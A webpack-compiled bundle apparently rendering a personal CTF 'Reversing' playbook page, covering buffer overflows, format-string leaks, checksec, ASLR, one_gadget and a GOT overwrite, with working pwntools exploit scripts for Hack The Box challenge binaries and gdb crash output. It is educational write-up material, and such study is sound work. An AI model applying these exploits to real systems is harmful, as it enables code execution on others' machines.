"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[630],{3380:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>l});var r=t(5893),s=t(1151);const i={slug:"/playbooks/reversing",pagination_next:null,pagination_prev:null,toc_min_heading_level:2,toc_max_heading_level:5},a=void 0,o={id:"Playbooks/Reversing",title:"Reversing",description:"There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both).",source:"@site/docs/Playbooks/Reversing.md",sourceDirName:"Playbooks",slug:"/playbooks/reversing",permalink:"/hacking/playbooks/reversing",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/playbooks/reversing",pagination_next:null,pagination_prev:null,toc_min_heading_level:2,toc_max_heading_level:5},sidebar:"tutorialSidebar"},c={},l=[{value:"Buffer overflow",id:"buffer-overflow",level:2},{value:"Overflow the stack pointer",id:"overflow-the-stack-pointer",level:3},{value:"Reach to the return address",id:"reach-to-the-return-address",level:3},{value:"Write the exploit",id:"write-the-exploit",level:3},{value:"Obfuscated code",id:"obfuscated-code",level:2},{value:"Hex to DEC &gt; DEC to char &gt; decode all string in base64",id:"hex-to-dec--dec-to-char--decode-all-string-in-base64",level:3},{value:"String format vulnerability",id:"string-format-vulnerability",level:2},{value:"Security flags",id:"security-flags",level:2},{value:"ASLR: Address Space Layout Randomisation",id:"aslr-address-space-layout-randomisation",level:2},{value:"One gadget",id:"one-gadget",level:2},{value:"Overwrite Global Object Table",id:"overwrite-global-object-table",level:2}];function d(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,s.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.p,{children:"There are a series of challenges where you are given a binary file and you need to be able to obtain the flag inside. In order to do so, you need to perform Reverse engineering. In order to do so, you should use a debugger or a decompiler (or both)."}),"\n",(0,r.jsx)(n.p,{children:"The first step is to use as a regular user and pay attention to the strings appearing in the UI. Later, we can search those strings in the decompiler."}),"\n",(0,r.jsxs)(n.p,{children:["One useful tool to perform this kind of analysis is ",(0,r.jsx)(n.a,{href:"https://github.com/NationalSecurityAgency/ghidra",children:"ghidra"}),"."]}),"\n",(0,r.jsx)(n.p,{children:"For instance, you can search for references, memory addresses, search for strings, etc.."}),"\n",(0,r.jsxs)(n.p,{children:["Another interesting tool is ",(0,r.jsx)(n.code,{children:"gdb"}),", the gnu debugger. More on this to come, when i'm not familiar."]}),"\n",(0,r.jsxs)(n.p,{children:["To debug Windows binaries, you can use ",(0,r.jsx)(n.code,{children:"ollydbg"}),", analyse the code and place the breakpoints in the interesting addresses."]}),"\n",(0,r.jsx)(n.h2,{id:"buffer-overflow",children:"Buffer overflow"}),"\n",(0,r.jsx)(n.p,{children:"In order to understand this attack, first we need to understand how the memory works in the computers."}),"\n",(0,r.jsx)(n.p,{children:"We first need to understand that memory has the following regions:"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Memory section"}),(0,r.jsx)(n.th,{children:"Description"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Stack"}),(0,r.jsx)(n.td,{children:"stores function local variables and information about function calls: return address, arguments, etc.."})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Heap"}),(0,r.jsx)(n.td,{children:"stores the dynamic memory. Used by malloc, etc..."})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"BSS"}),(0,r.jsx)(n.td,{children:"stores the uninitialized static/global variables"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Data"}),(0,r.jsx)(n.td,{children:"stores the static/global variables"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Text"}),(0,r.jsx)(n.td,{children:"read only, stores the executable code"})]})]})]}),"\n",(0,r.jsx)(n.p,{children:"Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Stack frame section"}),(0,r.jsx)(n.th,{children:"Description"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Function arguments"}),(0,r.jsx)(n.td,{})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Return address"}),(0,r.jsx)(n.td,{children:"where to go when the execution ends"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Previous frame pointer"}),(0,r.jsx)(n.td,{children:"to know what is the stack frame of the function calling this function"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Local variables"}),(0,r.jsx)(n.td,{})]})]})]}),"\n",(0,r.jsx)(n.p,{children:"Take this functions as example:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'#include <string.h>\nvoid foo(char *str)\n{\n  char buffer[12];\n  /* The following statement will result in buffer overflow */\n  strcpy(buffer, str);\n}\nint main()\n{\n  char *str = "This is definitely longer than 12";\n  foo(str);\n  return 1;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"The stack frame for foo() will look like this:"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Stack frame section"}),(0,r.jsx)(n.th,{children:"Value"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Function arguments"}),(0,r.jsx)(n.td,{children:"str (pointer)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Return address"}),(0,r.jsx)(n.td,{})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Previous frame pointer"}),(0,r.jsx)(n.td,{})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Local variables"}),(0,r.jsxs)(n.td,{children:["buffer[11]",(0,r.jsx)("br",{}),(0,r.jsx)("br",{}),"...",(0,r.jsx)("br",{}),"buffer[1]"]})]})]})]}),"\n",(0,r.jsx)(n.p,{children:"In this case, we can keep adding data into the buffer until we reach the memory address of the return address.\nThen, we can tell the program to jump to any function that we want."}),"\n",(0,r.jsx)(n.p,{children:"Knowing that, buffer overflow technique consists in three stages:"}),"\n",(0,r.jsx)(n.h3,{id:"overflow-the-stack-pointer",children:"Overflow the stack pointer"}),"\n",(0,r.jsxs)(n.p,{children:["When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: ",(0,r.jsx)(n.code,{children:"gets"})," function:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"void vuln(void)\n\n{\n  char local_bc [180];\n  \n  gets(local_bc);\n  puts(local_bc);\n  return;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:"In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack."}),"\n",(0,r.jsx)(n.h3,{id:"reach-to-the-return-address",children:"Reach to the return address"}),"\n",(0,r.jsx)(n.p,{children:"Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want."}),"\n",(0,r.jsx)(n.p,{children:"In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address."}),"\n",(0,r.jsx)(n.p,{children:"Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values."}),"\n",(0,r.jsxs)(n.p,{children:["You can do it in a less manual way using ",(0,r.jsx)(n.code,{children:"gdb-peda"}),":"]}),"\n",(0,r.jsx)(n.p,{children:"Knowing that the buffer has 180 chars, let's suppose that will 200 chars will overflow it, let's create a pattern of 200 chars:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"pattern_create 200 bof.txt"})}),"\n",(0,r.jsx)(n.p,{children:"and input it to the program:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"r < pattern.txt"})}),"\n",(0,r.jsx)(n.p,{children:"When the program crashes, we'll see the registers:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'You know who are 0xDiablos: \nAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n[----------------------------------registers-----------------------------------]\nEAX: 0xc9 \nEBX: 0x76414158 (\'XAAv\')\nECX: 0xf7fa09b4 --\x3e 0x0 \nEDX: 0x1 \nESI: 0xffffcf94 --\x3e 0xffffd165 ("/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln")\nEDI: 0xf7ffcb80 --\x3e 0x0 \nEBP: 0x41594141 (\'AAYA\')\nESP: 0xffffceb0 ("ZAAxAAyA")\nEIP: 0x41417741 (\'AwAA\')\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41417741\n[------------------------------------stack-------------------------------------]\n0000| 0xffffceb0 ("ZAAxAAyA")\n0004| 0xffffceb4 ("AAyA")\n0008| 0xffffceb8 --\x3e 0xf7fbeb00 --\x3e 0xf7d8fcd4 ("GCC_3.0")\n0012| 0xffffcebc --\x3e 0x3e8 \n0016| 0xffffcec0 --\x3e 0xffffcee0 --\x3e 0x1 \n0020| 0xffffcec4 --\x3e 0xf7f9f000 --\x3e 0x229dac \n0024| 0xffffcec8 --\x3e 0xf7ffd020 --\x3e 0xf7ffda40 --\x3e 0x0 \n0028| 0xffffcecc --\x3e 0xf7d96519 --\x3e 0x8310c483 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0x41417741 in ?? ()\n'})}),"\n",(0,r.jsxs)(n.p,{children:["The interesting one is ",(0,r.jsx)(n.code,{children:"EIP"})," as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well."]}),"\n",(0,r.jsxs)(n.p,{children:["Now, we can use ",(0,r.jsx)(n.code,{children:"pattern_offset"})," to obtain exactly the number of characters to reach to Return address:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"gdb-peda$ pattern_offset 0x41417741\n1094809409 found at offset: 188\n"})}),"\n",(0,r.jsx)(n.p,{children:"Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want."}),"\n",(0,r.jsx)(n.h3,{id:"write-the-exploit",children:"Write the exploit"}),"\n",(0,r.jsxs)(n.p,{children:["In the case I'm working on the exploit just need to call another function in the code. In order to so, I'll use python ",(0,r.jsx)(n.a,{href:"https://github.com/Gallopsled/pwntools",children:(0,r.jsx)(n.code,{children:"pwntools"})})," which helps a lot on these kind of things."]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ncontext.update(arch="i386", os="linux")\n\nelf = ELF("./vuln")\n\n# offset to reach right before return address\'s location\noffset = b"A" * 188\n\n# craft exploit: offset + flag() + padding + parameter 1 + parameter 2\nexploit = offset + p32(elf.symbols[\'flag\'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")\n\nr = elf.process()\nr.sendlineafter(":", exploit)\nr.interactive()\n'})}),"\n",(0,r.jsx)(n.p,{children:"Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters."}),"\n",(0,r.jsx)(n.h2,{id:"obfuscated-code",children:"Obfuscated code"}),"\n",(0,r.jsx)(n.p,{children:"Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.code,{children:"3734203635203636203132322036352036382034382036352037342031"})}),"\n",(0,r.jsx)(n.p,{children:"This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):"}),"\n",(0,r.jsx)(n.h3,{id:"hex-to-dec--dec-to-char--decode-all-string-in-base64",children:"Hex to DEC > DEC to char > decode all string in base64"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import binascii\nimport base64\n\ndef dec_to_chr(str):\n    return "".join([chr(int(s)) for s in str.decode(\'utf-8\').split(\' \')])\n\nbase64text = ""\nbase64text += dec_to_chr(binascii.unhexlify("3734203635203636203132322036352036382034382036352037342031") + binascii.unhexlify("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))\nbase64text +=  dec_to_chr(binascii.unhexlify("3635203631"))\nprint(base64.b64decode(base64text).decode())\n$s=\'77.74.\n'})}),"\n",(0,r.jsx)(n.p,{children:"In this case, this looks like the begining of a script trying to connect to an IP address."}),"\n",(0,r.jsx)(n.h2,{id:"string-format-vulnerability",children:"String format vulnerability"}),"\n",(0,r.jsx)(n.p,{children:"Some pieces of unsecure code, will print whatever the user is coding, see:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'__isoc99_scanf("%299s",local_148);\nprintf(local_148);\n'})}),"\n",(0,r.jsxs)(n.p,{children:["If we're a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: ",(0,r.jsx)(n.code,{children:"%p,%p,%p"})," will leak the first\nthree memory positions in the stack: ",(0,r.jsx)(n.code,{children:"0x1,0x1,0x7ffff7d14a37"})]}),"\n",(0,r.jsxs)(n.p,{children:["More info here ",(0,r.jsx)(n.a,{href:"https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/",children:"https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/"})]}),"\n",(0,r.jsxs)(n.p,{children:["More possible formats: ",(0,r.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Printf_format_string",children:"https://en.wikipedia.org/wiki/Printf_format_string"})]}),"\n",(0,r.jsx)(n.h2,{id:"security-flags",children:"Security flags"}),"\n",(0,r.jsxs)(n.p,{children:["When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use ",(0,r.jsx)(n.a,{href:"https://github.com/slimm609/checksec.sh",children:"checksec"}),":"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls\n[*] '/usr/bin/ls'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["RELRO: If there's no ",(0,r.jsx)(n.code,{children:"RELRO"})," protection, it means that the Global Object Table (",(0,r.jsx)(n.code,{children:"GOT"}),") is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes ",(0,r.jsx)(n.code,{children:"puts"}),", an attack can change the table to make it execute arbitrary code."]}),"\n",(0,r.jsx)(n.li,{children:"Stack: canary found, it means it hard to crash and gain code execution via buffer overflow."}),"\n",(0,r.jsx)(n.li,{children:"NX: No code execution from the stack"}),"\n",(0,r.jsx)(n.li,{children:"PIE: executable is loaded at random address."}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["More info ",(0,r.jsx)(n.a,{href:"https://opensource.com/article/21/6/linux-checksec",children:"https://opensource.com/article/21/6/linux-checksec"})]}),"\n",(0,r.jsx)(n.h2,{id:"aslr-address-space-layout-randomisation",children:"ASLR: Address Space Layout Randomisation"}),"\n",(0,r.jsx)(n.p,{children:"This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries."}),"\n",(0,r.jsx)(n.p,{children:"In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"gef\u27a4  aslr on\n[+] Enabling ASLR\ngef\u27a4  start\n"})}),"\n",(0,r.jsx)(n.h2,{id:"one-gadget",children:"One gadget"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://github.com/david942j/one_gadget",children:"https://github.com/david942j/one_gadget"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"libc"})," library has some pieces of code that runs a piece of code similar to ",(0,r.jsx)(n.code,{children:"execve('/bin/sh', NULL, NULL)"})," which will lead to remote code execution."]}),"\n",(0,r.jsx)(n.p,{children:"You can use the one gadget to know exactly the memory address you need to point to achive this RCE."}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 \n0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n  rbp == NULL || (u16)[rbp] == NULL\n\n0xebcf1 execve("/bin/sh", r10, [rbp-0x70])\nconstraints:\n  address rbp-0x78 is writable\n  [r10] == NULL || r10 == NULL\n  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL\n\n0xebcf5 execve("/bin/sh", r10, rdx)\nconstraints:\n  address rbp-0x78 is writable\n  [r10] == NULL || r10 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xebcf8 execve("/bin/sh", rsi, rdx)\nconstraints:\n  address rbp-0x78 is writable\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n'})}),"\n",(0,r.jsx)(n.p,{children:"For every memory address, it also describe which value the register need to have in order to execute the RCE."}),"\n",(0,r.jsx)(n.h2,{id:"overwrite-global-object-table",children:"Overwrite Global Object Table"}),"\n",(0,r.jsxs)(n.p,{children:["The global object table is used to dynamically resolve standard library functions (",(0,r.jsx)(n.code,{children:"scanf"}),", ",(0,r.jsx)(n.code,{children:"printf"}),", etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution."]}),"\n",(0,r.jsx)(n.p,{children:"Below, you can find an example of how we can override the global object table using the one gadget tool:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"from pwn import *\n\ncontext.binary = elf = ELF('./spooky_time')\nlibc = context.binary.libc\n\nr = process('./spooky_time')\n\nr.sendlineafter(b'scary!\\n\\n', '%3$lx%51$lx')\nr.recvuntil(b'than \\n')\nlibc.address = int(r.recvn(12), 16) - 1133111\nelf.address = int(r.recvn(12), 16) - 5056\nlibc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool\n\nfmtstr_payload = fmtstr_payload(8, {elf.got['puts'] : libc_one_gadget}) # we make the function puts point to a RCE\n\nr.sendlineafter(b'time..\\n\\n', fmtstr_payload)\n\nr.interactive()\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>a});var r=t(7294);const s={},i=r.createContext(s);function a(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);